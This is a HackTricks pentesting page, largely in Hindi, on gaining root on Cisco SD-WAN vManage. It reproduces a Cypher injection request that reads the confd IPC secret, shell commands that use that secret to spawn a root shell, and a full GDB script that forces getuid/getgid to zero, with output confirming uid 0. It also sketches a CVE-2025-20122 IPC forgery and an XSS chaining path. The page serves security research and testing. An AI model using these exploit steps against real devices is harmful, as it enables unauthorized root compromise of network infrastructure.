# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Path 1

(उदाहरण [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

confd और विभिन्न बाइनरीज़ से संबंधित कुछ दस्तावेज़ों में थोड़ी खोजबीन करने पर (जो Cisco वेबसाइट पर एक अकाउंट से उपलब्ध हैं), हमें पता चला कि IPC socket को प्रमाणित करने के लिए यह `/etc/confd/confd_ipc_secret` में स्थित एक secret का उपयोग करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
याद है हमारी Neo4j instance? यह `vmanage` उपयोगकर्ता की privileges के तहत चल रही है, इसलिए previous vulnerability का उपयोग करके हमें फ़ाइल प्राप्त करने की अनुमति देती है:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` प्रोग्राम कमांड लाइन आर्ग्युमेंट्स को सपोर्ट नहीं करता लेकिन यह `/usr/bin/confd_cli_user` को आर्ग्युमेंट्स के साथ कॉल करता है। इसलिए हम सीधे `/usr/bin/confd_cli_user` को अपने आर्ग्युमेंट्स के साथ कॉल कर सकते हैं। हालांकि यह हमारे वर्तमान privileges से readable नहीं है, इसलिए हमें इसे rootfs से retrieve करके scp से कॉपी करना होगा, help पढ़नी होगी, और इसे shell पाने के लिए उपयोग करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## पथ 2

(उदाहरण from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv टीम द्वारा लिखा गया ब्लॉग¹ root shell पाने का एक शानदार तरीका बताता है, लेकिन सावधानी यह है कि इसके लिए `/usr/bin/confd_cli_user` की एक कॉपी चाहिए जो केवल root द्वारा पढ़ी जा सकती है। मैंने बिना इस झंझट के root तक पहुँचने का एक और तरीका ढूँढा।

जब मैंने `/usr/bin/confd_cli` बाइनरी को disassemble किया, तो मैंने निम्नलिखित देखा:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

जब मैंने “ps aux” चलाया, तो निम्न देखा (_नोट -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने यह परिकल्पना की कि "confd_cli" प्रोग्राम लॉग इन किए गए उपयोगकर्ता से प्राप्त user ID और group ID को "cmdptywrapper" एप्लिकेशन को पास करता है।

मेरी पहली कोशिश यह थी कि मैं सीधे "cmdptywrapper" चलाऊं और इसे `-g 0 -u 0` प्रदान करूँ, लेकिन यह विफल रहा। ऐसा प्रतीत होता है कि किसी जगह एक file descriptor (`-i 1015`) बनाया गया था और मैं इसे नकली नहीं कर सकता।

जैसा कि synacktiv’s blog (last example) में उल्लेख किया गया है, `confd_cli` प्रोग्राम command line arguments को support नहीं करता, पर मैं इसे एक debugger से प्रभावित कर सकता हूँ और सौभाग्य से सिस्टम पर GDB शामिल है।

मैंने एक GDB script बनाया जहाँ मैंने API `getuid` और `getgid` को 0 लौटाने के लिए मजबूर किया। चूँकि मेरे पास पहले से deserialization RCE के माध्यम से “vmanage” privilege है, इसलिए मुझे सीधे `/etc/confd/confd_ipc_secret` पढ़ने की अनुमति है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
कंसोल आउटपुट:

<details>
<summary>कंसोल आउटपुट</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI इनपुट वैलिडेशन बग)

Cisco ने vManage का नाम बदलकर *Catalyst SD-WAN Manager* कर दिया है, लेकिन underlying CLI अभी भी उसी बॉक्स पर चलता है। एक 2025 advisory (CVE-2025-20122) में CLI में अपर्याप्त इनपुट वैलिडेशन का वर्णन है, जिससे **any authenticated local user** manager CLI service को crafted request भेजकर root प्राप्त कर सकता है। किसी भी low-priv foothold (उदाहरण: Path1 से Neo4j deserialization, या एक cron/backup user shell) को इस flaw के साथ जोड़कर आप `confd_cli_user` कॉपी किए बिना या GDB attach किए बिना root पर कूद सकते हैं:

1. अपने low-priv shell का उपयोग करके CLI IPC endpoint ढूँढें (आमतौर पर Path2 में port 4565 पर दिखने वाला `cmdptywrapper` listener)।
2. UID/GID fields को 0 के रूप में forge करने वाली CLI request बनाएं। वैलिडेशन बग original caller के UID को enforce करने में विफल रहता है, इसलिए wrapper एक root-backed PTY लॉन्च कर देता है।
3. किसी भी command sequence (`vshell; id`) को forged request के जरिए pipe करें ताकि root shell मिल सके।

> Exploit surface local-only है; initial shell लैंड करने के लिए remote code execution अभी भी आवश्यक है, लेकिन एक बार बॉक्स के अंदर होने पर exploitation debugger-based UID patch की बजाय एक single IPC message है।

## अन्य हालिया vManage/Catalyst SD-WAN Manager vulns जिन्हें chain किया जा सकता है

* **Authenticated UI XSS (CVE-2024-20475)** – विशिष्ट interface fields में JavaScript inject करें; admin session चोरी करने से आपको एक browser-driven path मिलता है जो `vshell` → local shell → Path3 के जरिए root तक पहुंचता है।

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
